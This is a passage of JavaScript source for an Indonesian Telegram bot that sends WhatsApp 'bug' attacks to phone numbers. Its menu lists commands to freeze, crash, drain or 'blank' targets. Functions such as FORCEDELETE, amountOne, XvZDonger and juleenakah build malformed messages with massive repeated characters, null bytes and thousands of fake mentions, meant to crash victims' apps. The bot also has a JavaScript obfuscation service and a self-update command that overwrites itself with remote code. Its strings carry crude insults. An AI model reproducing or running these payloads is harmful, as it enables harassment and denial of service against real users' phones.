      await deleteSentBugs(target);
      await deleteSentBugs(target);
      await deleteSentBugs(target);
    }

    await donerespone(target, ctx);
});


//auto update
bot.command("update", async (ctx) => {
  const chatId = ctx.chat.id;

  const repoRaw =
    "https://raw.githubusercontent.com/putxzz/Update/main/index.js";

  await ctx.reply("⏳ Sedang mengecek update...");

  try {
    const { data } = await axios.get(repoRaw);

    if (!data) {
      return ctx.reply("❌ Update gagal: File kosong!");
    }

    fs.writeFileSync("./index.js", data);

    await ctx.reply(
      "✅ Update berhasil!\nSilakan restart bot."
    );

    // restart jika pakai PM2

  } catch (e) {
    console.error(e);
    ctx.reply(
      "❌ Update gagal. Pastikan repo dan file index.js tersedia."
    );
  }
});
//url catbox
const FormData = require("form-data");

bot.command("tourl", async (ctx) => {
  const msg = ctx.message;
  const chatId = msg.chat.id;

  if (
    !msg.reply_to_message ||
    (!msg.reply_to_message.document &&
     !msg.reply_to_message.photo &&
     !msg.reply_to_message.video)
  ) {
    return ctx.reply(
      "```❌\n❌ Silakan reply sebuah file/foto/video dengan command /tourl```",
      { reply_to_message_id: msg.message_id, parse_mode: "Markdown" }
    );
  }

  const repliedMsg = msg.reply_to_message;
  let fileId, fileName;

  if (repliedMsg.document) {
    fileId = repliedMsg.document.file_id;
    fileName = repliedMsg.document.file_name || `file_${Date.now()}`;
  } else if (repliedMsg.photo) {
    fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await ctx.reply(
      "```⌛\n⏳ Mengupload ke Catbox...```",
      { reply_to_message_id: msg.message_id, parse_mode: "Markdown" }
    );

    // ambil link file dari Telegram
    const fileLink = await ctx.telegram.getFileLink(fileId);

    // download file sebagai stream
    const response = await axios.get(fileLink.href, {
      responseType: "stream",
    });

    // upload ke catbox
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", response.data, {
      filename: fileName,
      contentType: response.headers["content-type"],
    });

    const { data: catboxUrl } = await axios.post(
      "https://catbox.moe/user/api.php",
      form,
      { headers: form.getHeaders() }
    );

    await ctx.telegram.editMessageText(
      chatId,
      processingMsg.message_id,
      null,
      `*✅ Upload berhasil! 📎URL:*\n\`\`\`\n${catboxUrl}\n\`\`\``,
      { parse_mode: "Markdown" }
    );
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengupload file ke Catbox");
  }
});


// ---- command /enc (to encrypt js files)
bot.command("enchard", checkPremium, async (ctx) => {
    console.log(`Perintah diterima: /enc dari pengguna: ${ctx.from.username || ctx.from.id}`);
    const replyMessage = ctx.message.reply_to_message;

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return ctx.reply('❌ Silakan balas file .js untuk dienkripsi.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    try {
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileLink.href, { responseType: "text" });
        let codeString = response.data;

        if (typeof codeString !== "string") {
            throw new Error("File bukan dalam format string yang valid.");
        }

        ctx.reply("Sabar.. Lagi di Encrypt");

        let obfuscatedCode = await JsConfuser.obfuscate(codeString, {
            target: "node",
            compact: true,
            controlFlowFlattening: 0.8,
            deadCode: 0.3,
            dispatcher: true,
            duplicateLiteralsRemoval: 0.7,
            globalConcealing: true,
            minify: true,
            movedDeclarations: true,
            objectExtraction: true,
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.5,
            stringConcealing: true,
            stringCompression: true,
            opaquePredicates: 0.9,
            calculator: true,
            hexadecimalNumbers: true,
            shuffle: true,
            identifierGenerator: () => "高宝座DAMN齐Xz高宝座" + Math.random().toString(36).substring(7),
        });

        if (typeof obfuscatedCode === 'object' && obfuscatedCode.code) {
            obfuscatedCode = obfuscatedCode.code;
        }

        if (typeof obfuscatedCode !== 'string') {
            throw new Error("Hasil enkripsi bukan dalam format string.");
        }

        console.log(typeof obfuscatedCode, obfuscatedCode);

        const encryptedFilePath = `./KultusEncrypted_${fileName}`;
        fs.writeFileSync(encryptedFilePath, obfuscatedCode, "utf-8");

        await ctx.replyWithDocument(
            { source: encryptedFilePath, filename: `encrypted_${fileName}` },
            { caption: `✅ Encryption Successful\n• Type: Hades Hard\n• By @Putxzyy` }
        );

        fs.unlinkSync(encryptedFilePath);
    } catch (err) {
        console.error("Error during encryption:", err);
        await ctx.reply(`❌ An error occurred: ${err.message}`);
    }
});

// ---- command /enc (to encrypt js files)
bot.command("encninecore", checkPremium, async (ctx) => {
    const replyMessage = ctx.message.reply_to_message;

    if (!replyMessage || !replyMessage.document) {
        return ctx.reply("❌ Silakan balas file .js untuk dienkripsi.");
    }

    const fileName = replyMessage.document.file_name;
    if (!fileName.endsWith(".js")) {
        return ctx.reply("❌ Hanya file .js yang dapat dienkripsi.");
    }

    try {
        const fileId = replyMessage.document.file_id;
        const fileLink = await ctx.telegram.getFileLink(fileId);
        const response = await axios.get(fileLink.href, { responseType: "text" });
        let codeString = response.data;

        if (typeof codeString !== "string") {
            throw new Error("File bukan dalam format string yang valid.");
        }

        ctx.reply("⚡️ Lagi Diproses sama Kultus... Sbar lek");

        let obfuscatedCode = await JsConfuser.obfuscate(codeString, {
            target: "node",
            preset: "high",
            compact: true,
            minify: true,
            controlFlowFlattening: 0.9,
            deadCode: 0.2,
            dispatcher: true,
            renameVariables: true,
            renameGlobals: true,
            stringEncoding: true,
            stringSplitting: 0.4,
            stringConcealing: true,
            stringCompression: true,
            duplicateLiteralsRemoval: 0.8,
            shuffle: true,
            opaquePredicates: 0.85,
            calculator: true,
            hexadecimalNumbers: true,
            movedDeclarations: true,
            objectExtraction: true,
            globalConcealing: true,
            identifierGenerator: () => "高宝座AMPAS齐Xz高宝座" + Math.random().toString(36).substring(7),
        });

        if (typeof obfuscatedCode === 'object' && obfuscatedCode.code) {
            obfuscatedCode = obfuscatedCode.code;
        }

        if (typeof obfuscatedCode !== 'string') {
            throw new Error("Hasil enkripsi bukan dalam format string.");
        }

        console.log(typeof obfuscatedCode, obfuscatedCode);

        const encryptedFilePath = `./KultusEncrypted_${fileName}`;
        fs.writeFileSync(encryptedFilePath, obfuscatedCode, "utf-8");

        await ctx.replyWithDocument(
            { source: encryptedFilePath, filename: `encrypted_${fileName}` },
            { caption: `✅ Successful Encrypt\n• Type: Hades Nine Core\n• By @Putxzyy` }
        );

        fs.unlinkSync(encryptedFilePath);
    } catch (err) {
        console.error("Error during encryption:", err);
        await ctx.reply(`❌ An error occurred: ${err.message}`);
    }
});

//START SESI
startSesi();

bot.start(async (ctx) => {
  // Mengirim status "mengetik"
  await ctx.telegram.sendChatAction(ctx.chat.id, 'typing');

  // Periksa status koneksi, owner, admin, dan premium SEBELUM membuat pesan
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);

  const mainMenuMessage = 
`<blockquote><pre>╔══✠『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 』✠══╗
║ ⚝ ɴᴀᴍᴇ     : Exorcist Community
║ ⚝ ᴅᴇᴠ      : @Putxzyy
║ ⚝ ᴠᴇʀꜱɪᴏɴ  : 2.0
║ ⚝ ʟɪʙʀᴀʀʏ  : JavaScript
╚═════════════════════╝
</pre></blockquote>
`;

  const mainKeyboard = [
    [{
      text: "Ошибки меню",
      callback_data: "bugmenux"
    }],
      [{
      text: "Меню настроек",
      callback_data: "settingcmd"
    }],
      [{
      text: "Меню владельца",
      callback_data: "ownermenu"
    }],
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

//HANDLER UNTUK BUGMENU
bot.action('bugmenux', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const mainMenuMessage = 
`<blockquote><pre>┏━━━༺ 𖤐 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 𖤐 ༻━┓
┃ ✠ Nᴀᴍᴇ      : Exorcist Community
┃ ✠ Dᴇᴠᴇʟᴏᴘᴇʀ : @Putxzyy
┃ ✠ Vᴇʀsɪᴏɴ   : 2.0
┃ ✠ Lɪʙʀᴀʀʏ   : ᴊᴀᴠᴀsᴄʀɪᴘᴛ 
┗━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━༺ 🜏 𝐈𝐍𝐕𝐈𝐒𝐈𝐁𝐋𝐄 🜏 ༻━━┓
┃ ▷ /easydelay 62xx ⟶ ᴇᴀsʏ ᴅᴇʟᴀʏ
┃ ▷ /freeze 62xx ⟶ 𝙵𝚁𝙴𝙴𝚉𝙴 𝙷𝙾𝙼𝙴
┃ ▷ /drain 62xx ⟶  ǫᴜᴏᴛᴀ ᴅʀᴀɪɴ
┃ ▷ /xcrash 62xx ⟶ 𝙲𝚁𝙰𝚂𝙷 𝙾𝙽𝙴 𝙼𝚂𝙶 
┗━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━༺ ✦ 𝐇𝐀𝐑𝐃-𝐂𝐎𝐑𝐄 ✦ ༻━━┓
┃ ▷ /combo 62xx ⟶ 𝙲𝙾𝙼𝙱𝙾 𝙰𝙻𝙻 𝙱𝚄𝙶
┃ ▷ /hardelay 62xx ⟶ 𝙷𝙰𝚁𝙳 𝙳𝙴𝙻𝙰𝚈 𝚅𝟷
┃ ▷ /rimuru 62xx ⟶ 𝙷𝙰𝚁𝙳 𝙳𝙴𝙻𝙰𝚈 𝚅𝟸
┃ ▷ /viora 62xx ⟶ 𝙱𝙻𝙰𝙽𝙺 𝚅𝟷
┃ ▷ /ultimate 62xx ⟶ 𝙱𝙻𝙰𝙽𝙺 𝚅𝟸
┃ ▷ /ultimatum 62xx
┃ ▷ /vasion 62xx ⟶ 𝙲𝚁𝙰𝚂𝙷 𝙸𝙾𝚂
┗━━━━━━━━━━━━━━━━━━━━━━━┛

┏━━━━༺ ⚠ 𝐍𝐎𝐓𝐄𝐒 ⚠ ༻━━┓
┃ ⚠  sᴇɴᴅᴇʀ ᴡᴀᴊɪʙ ᴡᴀ ᴏʀɪ (ɴᴏ ʙɪsɴɪs)
┃ ⚠  ᴊᴀɴɢᴀɴ sᴘᴀᴍ ʙᴜɢ ʏ
┃ ⚠  ᴅɪᴊᴇᴅᴀ 𝟻/𝟷𝟶 ᴍɴᴛ ᴘᴇʀ ʙᴜɢ ɴʏᴀ.
┗━━━━━━━━━━━━━━━━━━━━━━━┛
</pre></blockquote>
`;

  const mainKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
  }],
    [{
    text: "🇷🇺",
    url: "https://t.me/Putxzyy"
    }]
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

// Handler untuk callback "owner_management"
bot.action('settingcmd', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const mainMenuMessage = 
`<blockquote><pre>┌─〔 EXORCIST COMMUNITY 〕─┐
│ Name      : Exorcist Community
│ Developer : @Putxzyy
│ Version   : 2.0 (Latest)
│ Library   : JavaScript
└──────────────────────┘

┌─〔 SETTINGS MENU 〕─┐
│ /cekusersc → Cek pengguna script
│ /monitoruser → Cek pengguna bot
│ /enchard → Encrypt .js (reply)
│ /encninecore → NineCore Enc.js (reply)
└──────────────────┘
</pre></blockquote>
`;

  const mainKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
  }],
    [{
    text: "🇷🇺",
    url: "https://t.me/Putxzyy"
    }]
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

bot.action('ownermenu', async (ctx) => {
  // Hapus pesan sebelumnya
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error("Error deleting message:", error);
  }

  const mainMenuMessage =
`<blockquote><pre>┌─〔 EXORCIST COMMUNITY 〕─┐
│ Name      : Exorcist Community
│ Developer : @Putxzyy
│ Version   : 2.0 (Latest)
│ Library   : JavaScript
└──────────────────────┘

┌─〔 OWNER MENU 〕─┐
│ /addprem [id] [30d]
│ /delprem [id]
│ /addadmin [id]      
│ /deladmin [id]
│ /xconnect [no wa]
└───────────────┘
</pre></blockquote>
`;
  const mainKeyboard = [
    [{
      text: "🔙",
      callback_data: "main_menu"
  }],
    [{
    text: "🇷🇺",
    url: "https://t.me/Putxzyy"
    }]
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

// Handler untuk callback "main_menu"
bot.action('main_menu', async (ctx) => {
  // Hapus pesan menu owner
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  // Kirim ulang menu utama (Anda dapat menggunakan kode yang sama seperti pada bot.start)
 const mainMenuMessage =
 `<blockquote><pre>╔══✠『 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍 』✠══╗
║ ⚝ ɴᴀᴍᴇ     : Exorcist Community
║ ⚝ ᴅᴇᴠ      : @Putxzyy
║ ⚝ ᴠᴇʀꜱɪᴏɴ  : 2.0
║ ⚝ ʟɪʙʀᴀʀʏ  : JavaScript
╚═════════════════════╝
</pre></blockquote>
`;

  const mainKeyboard = [
    [{
      text: "Ошибки меню",
      callback_data: "bugmenux"
    }],
      [{
      text: "Меню настроек𝘂",
      callback_data: "settingcmd"
    }],
      [{
      text: "Меню владельца",
      callback_data: "ownermenu"
    }],
  ];

  // Mengirim pesan setelah delay 3 detik (agar efek "mengetik" terlihat)
  setTimeout(async () => {
    await ctx.replyWithPhoto("https://files.catbox.moe/blufi0.jpg", {
      caption: mainMenuMessage,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
  }, 1000); // Delay 1 detik
});

//func bug disini//////

//ForceClose
async function FORCEDELETE(target) {
  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
  await sock.assertSessions(devices);
  let CallAudio = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch { }
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let AudioLite = CallAudio();
  let MessageDelete = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let BufferDelete = sock.createParticipantNodes.bind(sock);
  let encodeBuffer = sock.encodeWAMessage?.bind(sock);
  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

    let participateNode = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(participateNode.map(async ({ recipientJid: jid, message: msg }) => {

      let { user: targetUser } = jidDecode(jid);
      let { user: ownPnUser } = jidDecode(meId);
      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
      let y = jid === meId || jid === meLid;

      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

      let bytes = MessageDelete(encodeBuffer ? encodeBuffer(msg) : encodeWAMessage(msg));

      return AudioLite.mutex(jid, async () => {
        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

        return {
          tag: 'to',
          attrs: { jid },
          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
        };
      });

    }));

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };
  let BytesType = crypto.randomBytes(32);
  let nodeEncode = Buffer.concat([BytesType, Buffer.alloc(8, 0x01)]);

  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(
    devices,
    { conversation: "y" },
    { count: '0' }
  );
  let DecodeCall = {
    tag: "call",
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        {
          tag: "video",
          attrs: {
            orientation: "0",
            screen_width: "1920",
            screen_height: "1080",
            device_orientation: "0",
            enc: "vp8",
            dec: "vp8"
          }
        },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  };

  await sock.sendNode(DecodeCall);
  const TextMsg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "JOIN GRUP",
      contextInfo: {
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
  await sock.sendMessage(target, { delete: TextMsg.key });

}
async function nullExc(target) {
  await sock.relayMessage(target, {
    sendPaymentMessage: {}
  }, {
    participant: { jid:target }
  })
}
async function Crash(target) {
  return await sock.relayMessage(
    target,
    {
      requestPaymentMessage: {}
    },
    {
      messageId: sock.generateMessageTag(),
      fromMe: false,
      participant: { jid: target }
    }
  )
}
async function amountOne(target) {
  const Null = {
    requestPaymentMessage: {
      amount: {
       value: 1,
       offset: 0,
       currencyCodeIso4217: "IDR",
       requestFrom: target,
       expiryTimestamp: Date.now()
      },
      contextInfo: {
        externalAdReply: {
          title: null,
          body: "X".repeat(1500),
          mimetype: "audio/mpeg",
          caption: "X".repeat(1500),
          showAdAttribution: true,
          sourceUrl: null,
          thumbnailUrl: null
        }
      }
    }
  };
    
    let Payment = {
    interactiveMessage: {
      header: {
        title: "Null",
        subtitle: "ꦾ".repeat(10000),
        hasMediaAttachment: false
      },
      body: {
        text: "ꦾ".repeat(20000)
      },
      footer: {
        text: "ꦾ".repeat(20000)
      },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ꦾ".repeat(20000),
              sections: [
                {
                  title: "ꦾ".repeat(5000),
                  rows: [
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    }
                  ]
                },
                {
                  title: "ꦾ".repeat(20000) + "bokep simulator",
                  rows: [
                    { 
                      title: "ꦾ".repeat(5000), 
                      description: "ꦾ".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    },
                    { 
                      title: "Null", 
                      description: "\u0000".repeat(5000), 
                      id: "ꦾ".repeat(2000) 
                    }
                  ]
                }
              ]
            })
          }
        ]
      }
    }
  };
  
  
  await sock.relayMessage(target, Null, Payment, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
}

async function occolotopysV3(target, mention = true) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 1900 }, () => `1@s.whatsapp.net`)
      },
      body: {
        text: "X",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    mention
      ? { messageId: msg.key.id, participant: { jid: target } }
      : { messageId: msg.key.id }
  );

  console.log(chalk.red(`Succes Sending Bug To ${target}`));
}

//Blank
async function XvZDonger(target) {
  try {
    const xavienz1 = {
      viewOnceMessage: {
        message: {
          stickerPackMessage: {
            stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
            name: "ꦾ".repeat(50000),
            publisher: "𑜦𑜠".repeat(50000),
            caption: " 🩸⃟Xavienzz Attackᬊ ",
            stickers: Array.from({ length: 100 }, () => ({
              fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
              isAnimated: false,
              emojis: ["🧪", "⚠️"],
              accessibilityLabel: "",
              stickerSentTs: "PnX-ID-msg",
              isAvatar: true,
              isAiSticker: true,
              isLottie: true,
              mimetype: "image/webp"
            })),
            fileLength: "1073741824000",
            fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
            fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
            mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
            directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",
            contextInfo: {
              remoteJid: target,
              participant: "0@s.whatsapp.net",
              stanzaId: "1234567890ABCDEF",
              mentionedJid: [
                target,
                ...Array.from({ length: 1950 }, () =>
                  "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
                )
              ]
            },
            packDescription: "",
            mediaKeyTimestamp: Date.now(),
            trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
            thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
            thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
            thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
            thumbnailHeight: 252,
            thumbnailWidth: 252,
            imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
            stickerPackSize: "999999999",
            stickerPackOrigin: "USER_CREATED"
          }
        }
      }
    };

    const msg1 = await generateWAMessageFromContent(target, xavienz1, {});
    await sock.relayMessage(target, msg1.message, { messageId: msg1.key.id });

    const xavienz2 = {
      message: {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: "🩸⃟Xavienzz Attackᬊ" + "ꦽ".repeat(20000),
          address: "ꦽ".repeat(20000) + "ោ៝".repeat(10000),
          url: "https://t.me/" + "Xavienzz" + "ꦽ".repeat(20000),
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: "ꦽ".repeat(15000),
                mediaType: "IMAGE",
                jpegThumbnail: null,
                caption: "🩸⃟Xavienzz Attackᬊ" + "ꦽ".repeat(25000)
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    };

    const msg2 = await generateWAMessageFromContent(target, xavienz2,
      { userJid: sock?.user?.id }
    );

    await sock.relayMessage(target, msg2.message, { messageId: msg2.key.id });

  } catch (err) {
    console.error("Error:", err);
  }
}
async function juleenakah(target) {
    const memekjule = [
        "13135550002@s.whatsapp.net",
        target,
        ...Array.from({ length: 30000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    try {
        for (let i = 0; i < 100; i++) {
            const message = {
                botInvokeMessage: {
                    message: {
                        newsletterAdminInviteMessage: {
                            newsletterJid: '666@newsletter',
                            newsletterName: "ꦾ".repeat(60000),
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
                            caption: "ꦾ".repeat(90000),
                            inviteExpiration: Date.now() + 0x99999999999abcdef,
                        },
                    },
                },
                nativeFlowMessage: {
                    messageParamsJson: "[{".repeat(10000),
                    buttons: [
                        {
                            name: "mpm",
                            buttonParamsJson: "\u0000".repeat(808808)
                        },
                        {
                            name: "single_select",
                            buttonParamsJson: "{\"title\":\"" + "ྀ".repeat(77777) + "ྀ".repeat(77777) + "\",\"sections\":[{\"title\":\"" + "ྀ".repeat(77777) + "\",\"rows\":[]}]}"
                        },
                        {
                            name: "galaxy_message",
                            buttonParamsJson: JSON.stringify({ status: "1" })
                        },
                        {
                            name: "call_permission_request",
                            buttonParamsJson: "[{".repeat(808808)
                        }
                    ]
                },
                contextInfo: {
                    remoteJid: target,
                    participant: target,
                    mentionedJid: memekjule,
                    stanzaId: sock.generateMessageTag(),
                    businessMessageForwardInfo: {
                        businessOwnerJid: "13135550002@s.whatsapp.net"
                    },
                },
            };

            await sock.relayMessage(target, message, {
                userJid: target,
            });
        }
    } 
    catch (error) {
        console.log("error:\n" + error);
    }
}
async function gacorbgklz(target) {
  try {
    if (!target.includes("@s.whatsapp.net")) {
      target = target + "@s.whatsapp.net";
    }

    const button = {
      message: {
        stickerMessage: {
          url: "https://example.com/sticker.webp",
          mimetype: "image/webp",
          fileSha256: "example-sha256",
          fileLength: 1000,
          mediaKey: "example-media-key"
        }
      }
    }; 

    const begobagak = {
      message: {
        buttonsMessage: {
          contentText: "WOLKER",
          footerText: "WOLKER IS HERE",
          buttons: [
            {
              buttonId: "1",
              buttonText: { displayText: "click me sini tolol" },
              type: 1
            }
          ],
          headerType: 1
        }
      }
    };

    const naksirmaklu = {
      message: {
        reactionMessage: {
          key: {
            remoteJid: target,
            fromMe: false,
            id: "XXXXXXX"
          },
          reaction: "maklu🐉"
        }
      }
    };

    const vidiobokep = {
      message: {
        videoMessage: {
          url: "https://example.com/video.mp4",
          mimetype: "video/mp4",
          fileSha256: "example-sha256",
          fileLength: 1000,
          mediaKey: "example-media-key"
        }
      }
    };

    const ngentod = {
      message: {
        audioMessage: {
          url: "https://example.com/audio.mp3",
          mimetype: "audio/mp3",
          fileSha256: "example-sha256",
          fileLength: 1000,
          mediaKey: "example-media-key"
        }
      }
    };

    const okebisabisa = {
      message: {
        buttonsMessage: {
          contentText: "BG MAU HAPUS?",
          footerText: "KASIAN BANGET",
          buttons: [
            {
              buttonId: "delete",
              buttonText: { displayText: "HAPUS BEGO" },
              type: 1
            }
          ],
          headerType: 1
        }
      }
    };

    const salsasange = {
      message: {
        extendedTextMessage: {
          text: " ".repeat(15000)
        }
      }
    };

    const makluv1 = {
      message: {
        interactiveResponseMessage: {
          body: {
            text: " ".repeat(12000)
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{".repeat(5000) + "}".repeat(15000),
            version: 3
          }
        }
      }
    };

    const abimfile = {
      message: {
        documentMessage: {
          document: {
            url: "https://example.com/largefile.pdf",
            mimetype: "application/pdf",
            fileName: "largefile.pdf",
            fileLength: 1000000
          }
        }
      }
    };

